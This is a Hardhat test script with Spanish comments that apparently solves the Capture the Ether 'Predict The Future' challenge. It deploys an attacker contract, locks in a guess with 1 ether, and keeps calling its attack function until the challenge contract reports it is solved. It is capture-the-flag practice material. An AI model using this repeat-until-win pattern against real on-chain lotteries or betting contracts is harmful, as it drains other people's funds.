import { expect } from "chai";
import { ethers } from "hardhat";
import { Contract } from "ethers";
import { calmarLaManija } from "../../ayudines/calmarLaManija";

let predictContract: Contract;
let attackContract: Contract;

beforeEach(async() =>{
  const predictFactory = await ethers.getContractFactory("PredictTheFutureChallenge");
  // predictContract = await predictFactory.deploy();
  predictContract = await predictFactory.attach("0x4aD565be896BedF3b6BdCB5752B12CB9A5fFA383");
  const attackFactory = await ethers.getContractFactory("PredictTheFutureAttacker");
  attackContract = await attackFactory.deploy(predictContract.address);
})

describe("Predict The Future",async ()=>{
  it("Resuelve el Lottery challenge - Predict The Future",async()=>{
    await attackContract.lockInGuess(2,{
            value: ethers.utils.parseEther("1"),
            gasLimit: 1e5
    });

    while (!await predictContract.isComplete()) {
      try {
        const transaction = await attackContract.attack({gasLimit:1e5});
        console.log("----------------------------------------------------------------");
        console.log(transaction.hash);
      } catch (err:any) {
        console.log(`ATAQUE REALIZADO SIN ÉXITO. ${err.message}`);
      }
      await calmarLaManija(1e4); //Espero, porque si no va a iterar una banda de tiempo mostrando 99999 consologueos. Además puede haber mal funcionamiento porque el valor cambie a mitad de la ejecución.
    }
    const isComplete = await predictContract.isComplete();    
    expect(isComplete, "DESAFÍO INCOMPLETO").to.be.true;
  })
})